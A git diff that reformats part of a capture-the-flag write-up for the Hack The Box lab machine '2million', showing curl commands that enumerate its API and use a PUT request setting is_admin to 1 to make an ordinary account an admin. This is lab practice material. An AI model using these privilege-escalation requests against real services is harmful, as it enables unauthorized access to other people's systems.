@@ -115,7 +115,7 @@ Well, let's do that. We will use cURL to make the request:
 ```zsh
 curl -X POST http://2million.htb/api/v1/invite/generate
 ```
-```
+```json
 {"0":200,"success":1,"data":{"code":"UDJMQzEtSEtLOU0tOVVNVE8tQTc2UzM=","format":"encoded"}}
 ```
 
@@ -133,7 +133,7 @@ Looks like we got an invite code! Lets test it out:
 ```zsh
 curl -X POST http://2million.htb/api/v1/invite/verify -d "code=P2LC1-HKK9M-9UMTO-A76S3"
 ```
-```
+```json
 {"0":200,"success":1,"data":{"message":"Invite code is valid!"}}
 ```
 
@@ -273,17 +273,7 @@ Maybe we won't get there by bruteforcing. What happens if we cURL the /api endpo
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" http://2million.htb/api
 ```
-```
-HTTP/1.1 200 OK
-Server: nginx
-Date: Tue, 24 Feb 2026 10:10:10 GMT
-Content-Type: application/json
-Transfer-Encoding: chunked
-Connection: keep-alive
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-
+```json
 {"\/api\/v1":"Version 1 of the API"}
 ```
 
@@ -292,17 +282,7 @@ Looks like we are onto something! The api returned the existing endpoints, so if
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" http://2million.htb/api/v1
 ```
-```
-HTTP/1.1 200 OK
-Server: nginx
-Date: Tue, 24 Feb 2026 10:10:17 GMT
-Content-Type: application/json
-Transfer-Encoding: chunked
-Connection: keep-alive
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-
+```json
 {"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
 ```
 
@@ -326,17 +306,7 @@ Pragma: no-cache
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update
 ```
-```
-HTTP/1.1 200 OK
-Server: nginx
-Date: Tue, 24 Feb 2026 10:15:56 GMT
-Content-Type: application/json
-Transfer-Encoding: chunked
-Connection: keep-alive
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-
+```json
 {"status":"danger","message":"Invalid content type."}
 ```
 
@@ -345,17 +315,7 @@ If we try to use this endpoint (by sending an empty body), maybe it will "correc
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{}'
 ```
-```
-HTTP/1.1 200 OK  
-Server: nginx  
-Date: Tue, 24 Feb 2026 10:26:02 GMT  
-Content-Type: application/json  
-Transfer-Encoding: chunked  
-Connection: keep-alive  
-Expires: Thu, 19 Nov 1981 08:52:00 GMT  
-Cache-Control: no-store, no-cache, must-revalidate  
-Pragma: no-cache  
-  
+```json
 {"status":"danger","message":"Missing parameter: email"}
 ```
 
@@ -364,17 +324,7 @@ Lets add our account email:
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"abcdefg@abcdefg.abc"}'
 ```
-```
-HTTP/1.1 200 OK  
-Server: nginx  
-Date: Tue, 24 Feb 2026 10:28:15 GMT  
-Content-Type: application/json  
-Transfer-Encoding: chunked  
-Connection: keep-alive  
-Expires: Thu, 19 Nov 1981 08:52:00 GMT  
-Cache-Control: no-store, no-cache, must-revalidate  
-Pragma: no-cache  
-  
+```json  
 {"status":"danger","message":"Missing parameter: is_admin"}
 ```
 
@@ -383,34 +333,14 @@ Continuing with the same logic:
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"abcdefg@abcdefg.abc", "is_admin":true}'
 ```
-```
-HTTP/1.1 200 OK  
-Server: nginx  
-Date: Tue, 24 Feb 2026 10:28:59 GMT  
-Content-Type: application/json  
-Transfer-Encoding: chunked  
-Connection: keep-alive  
-Expires: Thu, 19 Nov 1981 08:52:00 GMT  
-Cache-Control: no-store, no-cache, must-revalidate  
-Pragma: no-cache  
-  
+```json
 {"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}
 ```
 
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email":"abcdefg@abcdefg.abc", "is_admin":1}'
 ```
-```
-HTTP/1.1 200 OK  
-Server: nginx  
-Date: Tue, 24 Feb 2026 10:29:17 GMT  
-Content-Type: application/json  
-Transfer-Encoding: chunked  
-Connection: keep-alive  
-Expires: Thu, 19 Nov 1981 08:52:00 GMT  
-Cache-Control: no-store, no-cache, must-revalidate  
-Pragma: no-cache  
-  
+```json
 {"id":13,"username":"abcdefg","is_admin":1}
 ```
 
@@ -419,17 +349,7 @@ If we use the /auth endpoint to check if we are now admin (using the same cookie
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" http://2million.htb/api/v1/admin/auth
 ```
-```
-HTTP/1.1 200 OK
-Server: nginx
-Date: Tue, 24 Feb 2026 10:32:14 GMT
-Content-Type: application/json
-Transfer-Encoding: chunked
-Connection: keep-alive
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-
+```json
 {"message":true}
 ```
 
@@ -438,17 +358,7 @@ Now we can generate the vpn connection file as admin:
 ```zsh
 curl -i -b "PHPSESSID=35lfv3mhobfgn8sbjqvvp2ii01" -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{}'
 ```
-```
-HTTP/1.1 200 OK
-Server: nginx
-Date: Tue, 24 Feb 2026 10:35:28 GMT
-Content-Type: text/html; charset=UTF-8
-Transfer-Encoding: chunked
-Connection: keep-alive
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-
+```json
 {"status":"danger","message":"Missing parameter: username"}
 ```
 
